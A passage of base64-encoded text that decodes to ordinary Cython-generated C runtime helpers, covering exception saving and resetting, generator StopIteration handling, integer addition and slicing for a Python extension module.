FZQkVfVU5VU0VEX1ZBUihpbl9hc3luY19nZW4pO1xuICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduXG4gICAgY3VyX2V4YyA9IF9fUHl4X1B5RXJyX0N1cnJlbnRFeGNlcHRpb25UeXBlKCk7XG4gICAgaWYgKGxpa2VseSghX19QeXhfUHlFcnJfR2l2ZW5FeGNlcHRpb25NYXRjaGVzKGN1cl9leGMsIFB5RXhjX1N0b3BJdGVyYXRpb24pKSkge1xuICAgICAgICBpZiAoaW5fYXN5bmNfZ2VuICYmIHVubGlrZWx5KF9fUHl4X1B5RXJyX0dpdmVuRXhjZXB0aW9uTWF0Y2hlcyhjdXJfZXhjLCBQeUV4Y19TdG9wQXN5bmNJdGVyYXRpb24pKSkge1xuICAgICAgICAgICAgaXNfYXN5bmNfc3RvcGl0ZXJhdGlvbiA9IDE7XG4gICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICByZXR1cm47XG4gICAgICAgIH1cbiAgICB9XG4gICAgX19QeXhfR2V0RXhjZXB0aW9uKCZleGMsICZ2YWwsICZ0Yik7XG4gICAgUHlfWERFQ1JFRihleGMpO1xuICAgIFB5X1hERUNSRUYodGIpO1xuICAgIG5ld19leGMgPSBQeU9iamVjdF9DYWxsRnVuY3Rpb24oUHlFeGNfUnVudGltZUVycm9yLCAicyIsXG4gICAgICAgIGlzX2FzeW5jX3N0b3BpdGVyYXRpb24gPyAiYXN5bmMgZ2VuZXJhdG9yIHJhaXNlZCBTdG9wQXN5bmNJdGVyYXRpb24iIDpcbiAgICAgICAgaW5fYXN5bmNfZ2VuID8gImFzeW5jIGdlbmVyYXRvciByYWlzZWQgU3RvcEl0ZXJhdGlvbiIgOlxuICAgICAgICAiZ2VuZXJhdG9yIHJhaXNlZCBTdG9wSXRlcmF0aW9uIik7XG4gICAgaWYgKCFuZXdfZXhjKSB7XG4gICAgICAgIFB5X1hERUNSRUYodmFsKTtcbiAgICAgICAgcmV0dXJuO1xuICAgIH1cbiAgICBQeUV4Y2VwdGlvbl9TZXRDYXVzZShuZXdfZXhjLCB2YWwpOyAvLyBzdGVhbHMgcmVmIHRvIHZhbFxuICAgIFB5RXJyX1NldE9iamVjdChQeUV4Y19SdW50aW1lRXJyb3IsIG5ld19leGMpO1xufVxuXG5cbnN0YXRpYyB2b2lkIF9fUHl4X1JhaXNlQ2xvc3VyZU5hbWVFcnJvcihjb25zdCBjaGFyICp2YXJuYW1lKSB7XG4gICAgUHlFcnJfRm9ybWF0KFB5RXhjX05hbWVFcnJvciwgImZyZWUgdmFyaWFibGUgXCclc1wnIHJlZmVyZW5jZWQgYmVmb3JlIGFzc2lnbm1lbnQgaW4gZW5jbG9zaW5nIHNjb3BlIiwgdmFybmFtZSk7XG59XG5cblxuI2lmIENZVEhPTl9VU0VfUFlUWVBFX0xPT0tVUCAmJiBDWVRIT05fVVNFX1RZUEVfU0xPVFNcbnN0YXRpYyBDWVRIT05fSU5MSU5FIFB5T2JqZWN0KiBfX1B5eF9fUHlPYmplY3RfTG9va3VwU3BlY2lhbChQeU9iamVjdCogb2JqLCBQeU9iamVjdCogYXR0cl9uYW1lLCBpbnQgd2l0aF9lcnJvcikge1xuICAgIFB5T2JqZWN0ICpyZXM7XG4gICAgUHlUeXBlT2JqZWN0ICp0cCA9IFB5X1RZUEUob2JqKTtcbiAgICByZXMgPSBfUHlUeXBlX0xvb2t1cCh0cCwgYXR0cl9uYW1lKTtcbiAgICBpZiAobGlrZWx5KHJlcykpIHtcbiAgICAgICAgZGVzY3JnZXRmdW5jIGYgPSBQeV9UWVBFKHJlcyktPnRwX2Rlc2NyX2dldDtcbiAgICAgICAgaWYgKCFmKSB7XG4gICAgICAgICAgICBQeV9JTkNSRUYocmVzKTtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIHJlcyA9IGYocmVzLCBvYmosIChQeU9iamVjdCAqKXRwKTtcbiAgICAgICAgfVxuICAgIH0gZWxzZSBpZiAod2l0aF9lcnJvcikge1xuICAgICAgICBQeUVycl9TZXRPYmplY3QoUHlFeGNfQXR0cmlidXRlRXJyb3IsIGF0dHJfbmFtZSk7XG4gICAgfVxuICAgIHJldHVybiByZXM7XG59XG4jZW5kaWZcblxuXG4jaWYgIUNZVEhPTl9WRUNUT1JDQUxMIHx8IFBZX1ZFUlNJT05fSEVYIDwgMHgwMzA5MDAwMFxuc3RhdGljIFB5T2JqZWN0ICpfX1B5eF9QeU9iamVjdF9GYXN0Q2FsbE1ldGhvZChQeU9iamVjdCAqbmFtZSwgUHlPYmplY3QgKmNvbnN0ICphcmdzLCBzaXplX3QgbmFyZ3NmKSB7XG4gICAgUHlPYmplY3QgKnJlc3VsdDtcbiAgICBQeU9iamVjdCAqYXR0ciA9IFB5T2JqZWN0X0dldEF0dHIoYXJnc1swXSwgbmFtZSk7XG4gICAgaWYgKHVubGlrZWx5KCFhdHRyKSlcbiAgICAgICAgcmV0dXJuIE5VTEw7XG4gICAgcmVzdWx0ID0gX19QeXhfUHlPYmplY3RfRmFzdENhbGwoYXR0ciwgYXJncysxLCBuYXJnc2YgLSAxKTtcbiAgICBQeV9ERUNSRUYoYXR0cik7XG4gICAgcmV0dXJuIHJlc3VsdDtcbn1cbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLICYmIENZVEhPTl9GQVNUX1RIUkVBRF9TVEFURVxuc3RhdGljIF9QeUVycl9TdGFja0l0ZW0gKlxuX19QeXhfUHlFcnJfR2V0VG9wbW9zdEV4Y2VwdGlvbihQeVRocmVhZFN0YXRlICp0c3RhdGUpXG57XG4gICAgX1B5RXJyX1N0YWNrSXRlbSAqZXhjX2luZm8gPSB0c3RhdGUtPmV4Y19pbmZvO1xuICAgIHdoaWxlICgoZXhjX2luZm8tPmV4Y192YWx1ZSA9PSBOVUxMIHx8IGV4Y19pbmZvLT5leGNfdmFsdWUgPT0gUHlfTm9uZSkgJiZcbiAgICAgICAgICAgZXhjX2luZm8tPnByZXZpb3VzX2l0ZW0gIT0gTlVMTClcbiAgICB7XG4gICAgICAgIGV4Y19pbmZvID0gZXhjX2luZm8tPnByZXZpb3VzX2l0ZW07XG4gICAgfVxuICAgIHJldHVybiBleGNfaW5mbztcbn1cbiNlbmRpZlxuXG5cbiNpZiBDWVRIT05fRkFTVF9USFJFQURfU1RBVEVcbnN0YXRpYyBDWVRIT05fSU5MSU5FIHZvaWQgX19QeXhfX0V4Y2VwdGlvblNhdmUoUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBQeU9iamVjdCAqKnR5cGUsIFB5T2JqZWN0ICoqdmFsdWUsIFB5T2JqZWN0ICoqdGIpIHtcbiAgI2lmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0sgJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBhNFxuICAgIF9QeUVycl9TdGFja0l0ZW0gKmV4Y19pbmZvID0gX19QeXhfUHlFcnJfR2V0VG9wbW9zdEV4Y2VwdGlvbih0c3RhdGUpO1xuICAgIFB5T2JqZWN0ICpleGNfdmFsdWUgPSBleGNfaW5mby0+ZXhjX3ZhbHVlO1xuICAgIGlmIChleGNfdmFsdWUgPT0gTlVMTCB8fCBleGNfdmFsdWUgPT0gUHlfTm9uZSkge1xuICAgICAgICAqdmFsdWUgPSBOVUxMO1xuICAgICAgICAqdHlwZSA9IE5VTEw7XG4gICAgICAgICp0YiA9IE5VTEw7XG4gICAgfSBlbHNlIHtcbiAgICAgICAgKnZhbHVlID0gZXhjX3ZhbHVlO1xuICAgICAgICBQeV9JTkNSRUYoKnZhbHVlKTtcbiAgICAgICAgKnR5cGUgPSAoUHlPYmplY3QqKSBQeV9UWVBFKGV4Y192YWx1ZSk7XG4gICAgICAgIFB5X0lOQ1JFRigqdHlwZSk7XG4gICAgICAgICp0YiA9IFB5RXhjZXB0aW9uX0dldFRyYWNlYmFjayhleGNfdmFsdWUpO1xuICAgIH1cbiAgI2VsaWYgQ1lUSE9OX1VTRV9FWENfSU5GT19TVEFDS1xuICAgIF9QeUVycl9TdGFja0l0ZW0gKmV4Y19pbmZvID0gX19QeXhfUHlFcnJfR2V0VG9wbW9zdEV4Y2VwdGlvbih0c3RhdGUpO1xuICAgICp0eXBlID0gZXhjX2luZm8tPmV4Y190eXBlO1xuICAgICp2YWx1ZSA9IGV4Y19pbmZvLT5leGNfdmFsdWU7XG4gICAgKnRiID0gZXhjX2luZm8tPmV4Y190cmFjZWJhY2s7XG4gICAgUHlfWElOQ1JFRigqdHlwZSk7XG4gICAgUHlfWElOQ1JFRigqdmFsdWUpO1xuICAgIFB5X1hJTkNSRUYoKnRiKTtcbiAgI2Vsc2VcbiAgICAqdHlwZSA9IHRzdGF0ZS0+ZXhjX3R5cGU7XG4gICAgKnZhbHVlID0gdHN0YXRlLT5leGNfdmFsdWU7XG4gICAgKnRiID0gdHN0YXRlLT5leGNfdHJhY2ViYWNrO1xuICAgIFB5X1hJTkNSRUYoKnR5cGUpO1xuICAgIFB5X1hJTkNSRUYoKnZhbHVlKTtcbiAgICBQeV9YSU5DUkVGKCp0Yik7XG4gICNlbmRpZlxufVxuc3RhdGljIENZVEhPTl9JTkxJTkUgdm9pZCBfX1B5eF9fRXhjZXB0aW9uUmVzZXQoUHlUaHJlYWRTdGF0ZSAqdHN0YXRlLCBQeU9iamVjdCAqdHlwZSwgUHlPYmplY3QgKnZhbHVlLCBQeU9iamVjdCAqdGIpIHtcbiAgI2lmIENZVEhPTl9VU0VfRVhDX0lORk9fU1RBQ0sgJiYgUFlfVkVSU0lPTl9IRVggPj0gMHgwMzBCMDBhNFxuICAgIF9QeUVycl9TdGFja0l0ZW0gKmV4Y19pbmZvID0gdHN0YXRlLT5leGNfaW5mbztcbiAgICBQeU9iamVjdCAqdG1wX3ZhbHVlID0gZXhjX2luZm8tPmV4Y192YWx1ZTtcbiAgICBleGNfaW5mby0+ZXhjX3ZhbHVlID0gdmFsdWU7XG4gICAgUHlfWERFQ1JFRih0bXBfdmFsdWUpO1xuICAgIFB5X1hERUNSRUYodHlwZSk7XG4gICAgUHlfWERFQ1JFRih0Yik7XG4gICNlbHNlXG4gICAgUHlPYmplY3QgKnRtcF90eXBlLCAqdG1wX3ZhbHVlLCAqdG1wX3RiO1xuICAgICNpZiBDWVRIT05fVVNFX0VYQ19JTkZPX1NUQUNLXG4gICAgX1B5RXJyX1N0YWNrSXRlbSAqZXhjX2luZm8gPSB0c3RhdGUtPmV4Y19pbmZvO1xuICAgIHRtcF90eXBlID0gZXhjX2luZm8tPmV4Y190eXBlO1xuICAgIHRtcF92YWx1ZSA9IGV4Y19pbmZvLT5leGNfdmFsdWU7XG4gICAgdG1wX3RiID0gZXhjX2luZm8tPmV4Y190cmFjZWJhY2s7XG4gICAgZXhjX2luZm8tPmV4Y190eXBlID0gdHlwZTtcbiAgICBleGNfaW5mby0+ZXhjX3ZhbHVlID0gdmFsdWU7XG4gICAgZXhjX2luZm8tPmV4Y190cmFjZWJhY2sgPSB0YjtcbiAgICAjZWxzZVxuICAgIHRtcF90eXBlID0gdHN0YXRlLT5leGNfdHlwZTtcbiAgICB0bXBfdmFsdWUgPSB0c3RhdGUtPmV4Y192YWx1ZTtcbiAgICB0bXBfdGIgPSB0c3RhdGUtPmV4Y190cmFjZWJhY2s7XG4gICAgdHN0YXRlLT5leGNfdHlwZSA9IHR5cGU7XG4gICAgdHN0YXRlLT5leGNfdmFsdWUgPSB2YWx1ZTtcbiAgICB0c3RhdGUtPmV4Y190cmFjZWJhY2sgPSB0YjtcbiAgICAjZW5kaWZcbiAgICBQeV9YREVDUkVGKHRtcF90eXBlKTtcbiAgICBQeV9YREVDUkVGKHRtcF92YWx1ZSk7XG4gICAgUHlfWERFQ1JFRih0bXBfdGIpO1xuICAjZW5kaWZcbn1cbiNlbmRpZlxuXG5cbiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9QWVBZXG5zdGF0aWMgUHlPYmplY3QqIF9fUHl4X0ZhbGxiYWNrX19fUHl4X1B5TG9uZ19BZGRPYmpDKFB5T2JqZWN0ICpvcDEsIFB5T2JqZWN0ICpvcDIsIGludCBpbnBsYWNlKSB7XG4gICAgcmV0dXJuIChpbnBsYWNlID8gUHlOdW1iZXJfSW5QbGFjZUFkZCA6IFB5TnVtYmVyX0FkZCkob3AxLCBvcDIpO1xufVxuI2lmIENZVEhPTl9VU0VfUFlMT05HX0lOVEVSTkFMU1xuc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9VbnBhY2tlZF9fX1B5eF9QeUxvbmdfQWRkT2JqQyhQeU9iamVjdCAqb3AxLCBQeU9iamVjdCAqb3AyLCBsb25nIGludHZhbCwgaW50IGlucGxhY2UsIGludCB6ZXJvZGl2aXNpb25fY2hlY2spIHtcbiAgICBDWVRIT05fTUFZQkVfVU5VU0VEX1ZBUihpbnBsYWNlKTtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUih6ZXJvZGl2aXNpb25fY2hlY2spO1xuICAgIGNvbnN0IGxvbmcgYiA9IGludHZhbDtcbiAgICBsb25nIGEsIHg7XG4jaWZkZWYgSEFWRV9MT05HX0xPTkdcbiAgICBjb25zdCBQWV9MT05HX0xPTkcgbGxiID0gaW50dmFsO1xuICAgIFBZX0xPTkdfTE9ORyBsbGEsIGxseDtcbiNlbmRpZlxuICAgIGlmICh1bmxpa2VseShfX1B5eF9QeUxvbmdfSXNaZXJvKG9wMSkpKSB7XG4gICAgICAgIHJldHVybiBfX1B5eF9OZXdSZWYob3AyKTtcbiAgICB9XG4gICAgaWYgKHVubGlrZWx5KCFfX1B5eF9QeUxvbmdfQ29tcGFjdEFzTG9uZyhvcDEsICZhKSkpIHtcbiAgICAgICAgY29uc3QgZGlnaXQqIGRpZ2l0cyA9IF9fUHl4X1B5TG9uZ19EaWdpdHMob3AxKTtcbiAgICAgICAgY29uc3QgUHlfc3NpemVfdCBzaXplID0gX19QeXhfUHlMb25nX1NpZ25lZERpZ2l0Q291bnQob3AxKTtcbiAgICAgICAgc3dpdGNoIChzaXplKSB7XG4gICAgICAgICAgICBjYXNlIC0yOlxuICAgICAgICAgICAgICAgIGlmICg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDIgKiBQeUxvbmdfU0hJRlQpIHtcbiAgICAgICAgICAgICAgICAgICAgYSA9IC0obG9uZykgKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpO1xuICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICAjaWZkZWYgSEFWRV9MT05HX0xPTkdcbiAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKDggKiBzaXplb2YoUFlfTE9OR19MT05HKSAtIDEgPiAyICogUHlMb25nX1NISUZUKSB7XG4gICAgICAgICAgICAgICAgICAgIGxsYSA9IC0oUFlfTE9OR19MT05HKSAoKCgoKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1swXSkpO1xuICAgICAgICAgICAgICAgICAgICBnb3RvIGxvbmdfbG9uZztcbiAgICAgICAgICAgICAgICAjZW5kaWZcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIO1xuICAgICAgICAgICAgY2FzZSAyOlxuICAgICAgICAgICAgICAgIGlmICg4ICogc2l6ZW9mKGxvbmcpIC0gMSA+IDIgKiBQeUxvbmdfU0hJRlQpIHtcbiAgICAgICAgICAgICAgICAgICAgYSA9IChsb25nKSAoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSk7XG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgICNpZmRlZiBIQVZFX0xPTkdfTE9OR1xuICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoOCAqIHNpemVvZihQWV9MT05HX0xPTkcpIC0gMSA+IDIgKiBQeUxvbmdfU0hJRlQpIHtcbiAgICAgICAgICAgICAgICAgICAgbGxhID0gKFBZX0xPTkdfTE9ORykgKCgoKCh1bnNpZ25lZCBQWV9MT05HX0xPTkcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbMF0pKTtcbiAgICAgICAgICAgICAgICAgICAgZ290byBsb25nX2xvbmc7XG4gICAgICAgICAgICAgICAgI2VuZGlmXG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDtcbiAgICAgICAgICAgIGNhc2UgLTM6XG4gICAgICAgICAgICAgICAgaWYgKDggKiBzaXplb2YobG9uZykgLSAxID4gMyAqIFB5TG9uZ19TSElGVCkge1xuICAgICAgICAgICAgICAgICAgICBhID0gLShsb25nKSAoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKTtcbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgI2lmZGVmIEhBVkVfTE9OR19MT05HXG4gICAgICAgICAgICAgICAgfSBlbHNlIGlmICg4ICogc2l6ZW9mKFBZX0xPTkdfTE9ORykgLSAxID4gMyAqIFB5TG9uZ19TSElGVCkge1xuICAgICAgICAgICAgICAgICAgICBsbGEgPSAtKFBZX0xPTkdfTE9ORykgKCgoKCgoKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBQWV9MT05HX0xPTkcpZGlnaXRzWzBdKSk7XG4gICAgICAgICAgICAgICAgICAgIGdvdG8gbG9uZ19sb25nO1xuICAgICAgICAgICAgICAgICNlbmRpZlxuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7XG4gICAgICAgICAgICBjYXNlIDM6XG4gICAgICAgICAgICAgICAgaWYgKDggKiBzaXplb2YobG9uZykgLSAxID4gMyAqIFB5TG9uZ19TSElGVCkge1xuICAgICAgICAgICAgICAgICAgICBhID0gKGxvbmcpICgoKCgoKCh1bnNpZ25lZCBsb25nKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBsb25nKWRpZ2l0c1swXSkpO1xuICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICAjaWZkZWYgSEFWRV9MT05HX0xPTkdcbiAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKDggKiBzaXplb2YoUFlfTE9OR19MT05HKSAtIDEgPiAzICogUHlMb25nX1NISUZUKSB7XG4gICAgICAgICAgICAgICAgICAgIGxsYSA9IChQWV9MT05HX0xPTkcpICgoKCgoKCh1bnNpZ25lZCBQWV9MT05HX0xPTkcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1swXSkpO1xuICAgICAgICAgICAgICAgICAgICBnb3RvIGxvbmdfbG9uZztcbiAgICAgICAgICAgICAgICAjZW5kaWZcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgQ1lUSE9OX0ZBTExUSFJPVUdIO1xuICAgICAgICAgICAgY2FzZSAtNDpcbiAgICAgICAgICAgICAgICBpZiAoOCAqIHNpemVvZihsb25nKSAtIDEgPiA0ICogUHlMb25nX1NISUZUKSB7XG4gICAgICAgICAgICAgICAgICAgIGEgPSAtKGxvbmcpICgoKCgoKCgoKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzJdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIGxvbmcpZGlnaXRzWzBdKSk7XG4gICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgICNpZmRlZiBIQVZFX0xPTkdfTE9OR1xuICAgICAgICAgICAgICAgIH0gZWxzZSBpZiAoOCAqIHNpemVvZihQWV9MT05HX0xPTkcpIC0gMSA+IDQgKiBQeUxvbmdfU0hJRlQpIHtcbiAgICAgICAgICAgICAgICAgICAgbGxhID0gLShQWV9MT05HX0xPTkcpICgoKCgoKCgoKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1syXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBQWV9MT05HX0xPTkcpZGlnaXRzWzFdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbMF0pKTtcbiAgICAgICAgICAgICAgICAgICAgZ290byBsb25nX2xvbmc7XG4gICAgICAgICAgICAgICAgI2VuZGlmXG4gICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDtcbiAgICAgICAgICAgIGNhc2UgNDpcbiAgICAgICAgICAgICAgICBpZiAoOCAqIHNpemVvZihsb25nKSAtIDEgPiA0ICogUHlMb25nX1NISUZUKSB7XG4gICAgICAgICAgICAgICAgICAgIGEgPSAobG9uZykgKCgoKCgoKCgodW5zaWduZWQgbG9uZylkaWdpdHNbM10pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMV0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgbG9uZylkaWdpdHNbMF0pKTtcbiAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgI2lmZGVmIEhBVkVfTE9OR19MT05HXG4gICAgICAgICAgICAgICAgfSBlbHNlIGlmICg4ICogc2l6ZW9mKFBZX0xPTkdfTE9ORykgLSAxID4gNCAqIFB5TG9uZ19TSElGVCkge1xuICAgICAgICAgICAgICAgICAgICBsbGEgPSAoUFlfTE9OR19MT05HKSAoKCgoKCgoKCh1bnNpZ25lZCBQWV9MT05HX0xPTkcpZGlnaXRzWzNdKSA8PCBQeUxvbmdfU0hJRlQpIHwgKHVuc2lnbmVkIFBZX0xPTkdfTE9ORylkaWdpdHNbMl0pIDw8IFB5TG9uZ19TSElGVCkgfCAodW5zaWduZWQgUFlfTE9OR19MT05HKWRpZ2l0c1sxXSkgPDwgUHlMb25nX1NISUZUKSB8ICh1bnNpZ25lZCBQWV9MT05HX0xPTkcpZGlnaXRzWzBdKSk7XG4gICAgICAgICAgICAgICAgICAgIGdvdG8gbG9uZ19sb25nO1xuICAgICAgICAgICAgICAgICNlbmRpZlxuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICBDWVRIT05fRkFMTFRIUk9VR0g7XG4gICAgICAgICAgICBkZWZhdWx0OiByZXR1cm4gUHlMb25nX1R5cGUudHBfYXNfbnVtYmVyLT5uYl9hZGQob3AxLCBvcDIpO1xuICAgICAgICB9XG4gICAgfVxuICAgICAgICAgICAgeCA9IGEgKyBiO1xuICAgICAgICByZXR1cm4gUHlMb25nX0Zyb21Mb25nKHgpO1xuI2lmZGVmIEhBVkVfTE9OR19MT05HXG4gICAgbG9uZ19sb25nOlxuICAgICAgICAgICAgbGx4ID0gbGxhICsgbGxiO1xuICAgICAgICByZXR1cm4gUHlMb25nX0Zyb21Mb25nTG9uZyhsbHgpO1xuI2VuZGlmXG4gICAgcmV0dXJuIF9fUHl4X0ZhbGxiYWNrX19fUHl4X1B5TG9uZ19BZGRPYmpDKG9wMSwgb3AyLCBpbnBsYWNlKTtcbiAgICBcbiAgICBcbn1cbiNlbmRpZlxuc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9GbG9hdF9fX1B5eF9QeUxvbmdfQWRkT2JqQyhQeU9iamVjdCAqZmxvYXRfdmFsLCBsb25nIGludHZhbCwgaW50IHplcm9kaXZpc2lvbl9jaGVjaykge1xuICAgIENZVEhPTl9VTlVTRURfVkFSKHplcm9kaXZpc2lvbl9jaGVjayk7XG4gICAgY29uc3QgbG9uZyBiID0gaW50dmFsO1xuICAgIGRvdWJsZSBhID0gX19QeXhfUHlGbG9hdF9BU19ET1VCTEUoZmxvYXRfdmFsKTtcbiAgICAgICAgZG91YmxlIHJlc3VsdDtcbiAgICAgICAgXG4gICAgICAgIHJlc3VsdCA9ICgoZG91YmxlKWEpICsgKGRvdWJsZSliO1xuICAgICAgICByZXR1cm4gUHlGbG9hdF9Gcm9tRG91YmxlKHJlc3VsdCk7XG59XG5zdGF0aWMgQ1lUSE9OX0lOTElORSBQeU9iamVjdCogX19QeXhfUHlMb25nX0FkZE9iakMoUHlPYmplY3QgKm9wMSwgUHlPYmplY3QgKm9wMiwgbG9uZyBpbnR2YWwsIGludCBpbnBsYWNlLCBpbnQgemVyb2RpdmlzaW9uX2NoZWNrKSB7XG4gICAgQ1lUSE9OX01BWUJFX1VOVVNFRF9WQVIoaW50dmFsKTtcbiAgICBDWVRIT05fVU5VU0VEX1ZBUih6ZXJvZGl2aXNpb25fY2hlY2spO1xuICAgICNpZiBDWVRIT05fVVNFX1BZTE9OR19JTlRFUk5BTFNcbiAgICBpZiAobGlrZWx5KFB5TG9uZ19DaGVja0V4YWN0KG9wMSkpKSB7XG4gICAgICAgIHJldHVybiBfX1B5eF9VbnBhY2tlZF9fX1B5eF9QeUxvbmdfQWRkT2JqQyhvcDEsIG9wMiwgaW50dmFsLCBpbnBsYWNlLCB6ZXJvZGl2aXNpb25fY2hlY2spO1xuICAgIH1cbiAgICAjZW5kaWZcbiAgICBpZiAoUHlGbG9hdF9DaGVja0V4YWN0KG9wMSkpIHtcbiAgICAgICAgcmV0dXJuIF9fUHl4X0Zsb2F0X19fUHl4X1B5TG9uZ19BZGRPYmpDKG9wMSwgaW50dmFsLCB6ZXJvZGl2aXNpb25fY2hlY2spO1xuICAgIH1cbiAgICByZXR1cm4gX19QeXhfRmFsbGJhY2tfX19QeXhfUHlMb25nX0FkZE9iakMob3AxLCBvcDIsIGlucGxhY2UpO1xufVxuI2VuZGlmXG5cblxuc3RhdGljIENZVEhPTl9JTkxJTkUgUHlPYmplY3QqIF9fUHl4X1B5T2JqZWN0X0dldFNsaWNlKFB5T2JqZWN0KiBvYmosXG4gICAgICAgIFB5X3NzaXplX3QgY3N0YXJ0LCBQeV9zc2l6ZV90IGNzdG9wLFxuICAgICAgICBQeU9iamVjdCoqIF9weV9zdGFydCwgUHlPYmplY3QqKiBfcHlfc3RvcCwgUHlPYmplY3QqKiBfcHlfc2xpY2UsXG4gICAgICAgIGludCBoYXNfY3N0YXJ0LCBpbnQgaGFzX2NzdG9wLCBDWVRIT05fVU5VU0VEIGludCB3cmFwYXJvdW5kKSB7XG4gICAgX19QeXhfVHlwZU5hbWUgb2JqX3R5cGVfbmFtZTtcbiNpZiBDWVRIT05fVVNFX1RZUEVfU0xPVFNcbiAgICBQeU1hcHBpbmdNZXRob2RzKiBtcCA9IFB5X1RZUEUob2JqKS0+dHBfYXNfbWFwcGluZztcbiAgICBpZiAobGlrZWx5KG1wICYmIG1wLT5tcF9zdWJzY3JpcHQpKVxuI2VuZGlmXG4gICAge1xuICAgICAgICBQeU9iamVjdCogcmVzdWx0O1xuICAgICAgICBQeU9iamVjdCAqcHlfc2xpY2UsICpweV9zdGFydCwgKnB5X3N0b3A7XG4gICAgICAgIGlmIChfcHlfc2xpY2UpIHtcbiAgICAgICAgICAgIHB5X3NsaWNlID0gKl9weV9zbGljZTtcbiAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgIFB5T2JqZWN0KiBvd25lZF9zdGFydCA9IE5VTEw7XG4gICAgICAgICAgICBQeU9iamVjdCogb3duZWRfc3RvcCA9IE5VTEw7XG4gICAgICAgICAgICBpZiAoX3B5X3N0YXJ0KSB7XG4gICAgICAgICAgICAgICAgcHlfc3RhcnQgPSAqX3B5X3N0YXJ0O1xuICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICBpZiAoaGFzX2NzdGFydCkge1xuICAgICAgICAgICAgICAgICAgICBvd25lZF9zdGFydCA9IHB5X3N0YXJ0ID0gUHlMb25nX0Zyb21Tc2l6ZV90KGNzdGFydCk7XG4gICAgICAgICAgICAgICAgICAgIGlmICh1bmxpa2VseSghcHlfc3RhcnQpKSBnb3RvIGJhZDtcbiAgICAgICAgICAgICAgICB9IGVsc2VcbiAgICA